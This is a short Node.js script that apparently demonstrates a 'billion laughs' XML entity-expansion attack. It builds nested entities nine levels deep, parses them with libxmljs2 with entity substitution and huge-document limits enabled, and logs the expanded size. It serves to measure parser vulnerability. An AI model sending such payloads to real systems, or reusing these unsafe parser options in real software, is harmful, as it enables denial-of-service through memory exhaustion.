'use strict';

const libxmljs = require('libxmljs2');
const lineSize = 10;
const opts = {noent: true, nocdata: true, noblanks: true, huge: true};

let xmlStart = `<?xml version="1.0"?>
 <!DOCTYPE lolz [
 <!ENTITY lol0 "lol">
 <!ELEMENT lolz (#PCDATA)>`;

console.log('#Lolz\tSize (MB)');

const maxLolz = 9;
for (let i = 1; i <= maxLolz; i++) {
    const entityLine = `<!ENTITY lol${i} "${Array(lineSize).fill('&lol' + (i - 1) + ';').join('')}">`;
    xmlStart += `\n ${entityLine}`;
    const xml = `${xmlStart}\n]>\n<lolz>&lol${i};</lolz>`;

    const parsed = libxmljs.parseXml(xml, opts);
    const expandedLength = (parsed.root().text().length / 1024 / 1024).toFixed(4);
    console.log(`${i}\t${expandedLength}`);
}
